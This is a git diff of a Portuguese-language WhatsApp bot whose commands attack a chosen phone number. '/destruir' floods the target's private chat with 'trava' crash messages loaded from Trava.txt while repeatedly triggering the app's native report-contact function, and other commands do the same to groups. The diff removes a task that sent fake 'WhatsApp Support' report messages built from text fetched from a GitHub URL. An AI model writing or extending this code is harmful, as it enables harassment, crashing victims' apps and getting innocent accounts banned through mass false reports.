@@ -342,7 +342,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
-                await waSock.sendMessage(remoteJid, { text: `🛡️ Disparando denúncias nativas de contato para \`${alvoNum}\` (${quantidade} ciclos)...` });
+                await waSock.sendMessage(remoteJid, { text: `🛡️ Disparando denúncias nativas silenciosas (sem mandar mensagem) para \`${alvoNum}\` (${quantidade} ciclos)...` });
 
                 for (let i = 1; i <= quantidade; i++) {
                     try {
@@ -357,7 +357,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                         await delay(700);
                     } catch (err) {}
                 }
-                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo de denúncias nativas /B4N para \`${alvoNum}\` finalizado!` });
+                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo de denúncias nativas /B4N para \`${alvoNum}\` concluído!` });
             }
             else if (texto.startsWith('/B4NGRUPO ')) {
                 const linkGrupo = texto.replace('/B4NGRUPO', '').trim();
@@ -429,7 +429,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
 
                 await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada com sucesso nos 5 grupos!` });
             }
-            // COMANDO DESTRUIR TOTAL (TRAVA + DENÚNCIA NATIVA DE CONTATO + FEEDBACK DO GITHUB)
+            // COMANDO DESTRUIR TOTAL (TRAVA NO PV + DENÚNCIA NATIVA DE CONTATO SILENCIOSA)
             else if (texto.startsWith('/destruir ')) {
                 const partes = texto.replace('/destruir', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
@@ -442,7 +442,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
 
-                await waSock.sendMessage(remoteJid, { text: `🚨 *ATAQUE TOTAL INICIADO* 🚨\nAlvo: \`${alvoNum}\`\nCiclos: ${quantidade}\n_Disparando travas, denúncias nativas e feedback do GitHub simultaneamente..._` });
+                await waSock.sendMessage(remoteJid, { text: `🚨 *ATAQUE TOTAL INICIADO* 🚨\nAlvo: \`${alvoNum}\`\nCiclos: ${quantidade}\n_Disparando travas no PV e denúncias nativas silenciosas simultaneamente..._` });
 
                 // 1. Carrega a trava local (Trava.txt)
                 let conteudoTrava = "⚡ [ZRX-DESTRUCTION] Alvo sob ataque total!";
@@ -452,15 +452,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     if (lido.length > 0) conteudoTrava = lido;
                 }
 
-                // 2. Carrega o texto de feedback direto do GitHub
-                const urlTextoGitHub = "https://raw.githubusercontent.com/SEU_USUARIO/SEU_REPO/main/feedback.txt";
-                let textoFeedbackGitHub = await consultarAPI(urlTextoGitHub);
-                let baseFeedback = textoFeedbackGitHub?.resultado || textoFeedbackGitHub;
-                if (!baseFeedback || typeof baseFeedback !== 'string' || baseFeedback.includes('erro')) {
-                    baseFeedback = "Support and Feedback: Target violating terms of service and distributing malicious payloads.";
-                }
-
-                // Tarefa 1: Envia as travas pesadas para o chat do alvo
+                // Tarefa 1: Envia as travas pesadas para o chat privado do alvo
                 const tarefaTrava = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
                         try {
@@ -470,7 +462,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 })();
 
-                // Tarefa 2: Aciona a denúncia nativa de contato (botão de denunciar dos três pontos)
+                // Tarefa 2: Aciona a denúncia nativa de contato (botão de denunciar dos três pontos, 100% silenciosa no chat)
                 const tarefaDenunciaNativa = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
                         try {
@@ -487,24 +479,8 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 })();
 
-                // Tarefa 3: Envia denúncia pelo feedback utilizando o texto do GitHub
-                const tarefaFeedbackGithub = (async () => {
-                    for (let i = 1; i <= quantidade; i++) {
-                        try {
-                            const mensagemFeedbackFinal = 
-                                `*[WHATSAPP SUPPORT & FEEDBACK REPORT]*\n` +
-                                `Target Phone: +${alvoNum}\n\n` +
-                                `${baseFeedback}\n\n` +
-                                `[Feedback Report Cycle #${i}/${quantidade}]`;
-
-                            await waSock.sendMessage(jidAlvo, { text: mensagemFeedbackFinal });
-                            await delay(600);
-                        } catch (err) {}
-                    }
-                })();
-
-                // Executa as três tarefas em paralelo absoluto
-                await Promise.all([tarefaTrava, tarefaDenunciaNativa, tarefaFeedbackGithub]);
+                // Executa as duas tarefas em paralelo absoluto
+                await Promise.all([tarefaTrava, tarefaDenunciaNativa]);
 
                 await waSock.sendMessage(remoteJid, { text: `🔥 Ataque total ao número \`${alvoNum}\` finalizado com sucesso!` });
             }
